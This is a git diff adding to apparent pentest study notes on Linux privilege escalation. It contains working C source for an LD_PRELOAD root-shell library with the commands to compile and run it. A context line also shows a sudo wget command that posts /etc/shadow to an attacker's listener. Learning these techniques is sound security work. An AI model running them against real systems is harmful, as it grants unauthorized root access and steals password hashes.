@@ -179,6 +179,40 @@ Using the intended functionality of an application to be able to exploit a syste
     But after `sudo -l` we see we have sudo permissions to wget.
     We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.
 
+## Excalation via LD_Preload
+Basically, preloading a malicious library to run as sudo
+- Enumeration
+```
+sudo -l
+Matching Defaults entries for Chvxt3r on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User Chvxt3r may run the following commands on this host:
+    [...SNIP...]
+```
+- Sample dll (shell.c)
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+- Compile with gcc
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+- Exploitation
+```
+sudo LD_PRELOAD=[path-to-file]/shell.so
+```
+## Escalation via CVE-2019-14287
+
 # Escalation Path: SUID
 
 # Escalation Path: Other SUID Escalation
